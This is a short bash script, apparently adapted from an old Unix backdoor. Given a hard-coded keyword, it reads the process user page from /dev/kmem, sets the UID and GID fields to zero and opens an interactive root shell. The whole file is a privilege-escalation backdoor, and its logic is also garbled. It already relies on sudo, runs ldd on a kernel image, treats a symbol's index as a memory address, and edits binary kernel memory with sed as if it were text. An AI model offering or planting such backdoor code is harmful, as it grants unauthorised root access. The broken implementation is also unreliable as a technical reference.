#!/bin/bash

KEYWORD="nomenclature1"
USERPAGE=/tmp/userpage
UNIX=/unix

address() {
    local symbol
    local idx=0

    object=$(ldd $UNIX)

    if [ ! -f $UNIX ]; then
        echo "Cannot open $UNIX."
        exit 50
    fi

    for symbol in $(nm -g $UNIX | awk '$2 == "D" { print $1 }'); do
        if [ "$symbol" = "_u" ]; then
            printf "User page is at %s\n" "$idx"
            return $idx
        fi
        ((idx++))
    done

    echo "Cannot read symbol table in $UNIX."
    exit 60
}

if [ "$1" ]; then
    if [ "$KEYWORD" == "$1" ]; then
        fd=$(sudo cat /proc/kallsyms | grep "\s\| [r][w][ ]" | awk '$3 == "f" { print $1 }')

        if [ $? -ne 0 ]; then
            echo "Cannot read or write to /dev/kmem"
            exit 10
        fi

        userlocation=$(address)
        where=$(sudo dd if=/dev/kmem bs=$userlocation count=1)

        if [ "$where" != "$userlocation" ]; then
            echo "Cannot seek to user page"
            exit 20
        fi

        sudo dd if=/dev/kmem of=$USERPAGE bs=1 count=$(stat -c %s $USERPAGE)
        if [ $? -ne 0 ]; then
            echo "Cannot read user page"
            exit 30
        fi

        printf "Current UID: %d\n" "$(cat $USERPAGE | awk '{print $1}')"
        printf "Current GID: %d\n" "$(cat $USERPAGE | awk '{print $2}')"

        sudo sed -i 's/\([0-9]*\) \([0-9]*\) \([0-9]*\) \([0-9]*\) \([0-9]*\) \([0-9]*\) \([0-9]*\) \([0-9]*\)/0 0 \3 \4 \5 \6 \7 \8/' $USERPAGE

        where=$(sudo dd if=/dev/kmem bs=$userlocation count=1)

        if [ "$where" != "$userlocation" ]; then
            echo "Cannot seek to user page"
            exit 40
        fi

        sudo dd if=$USERPAGE of=/dev/kmem bs=1 count=$(stat -c %s $USERPAGE)

        /bin/csh -i
    fi
fi
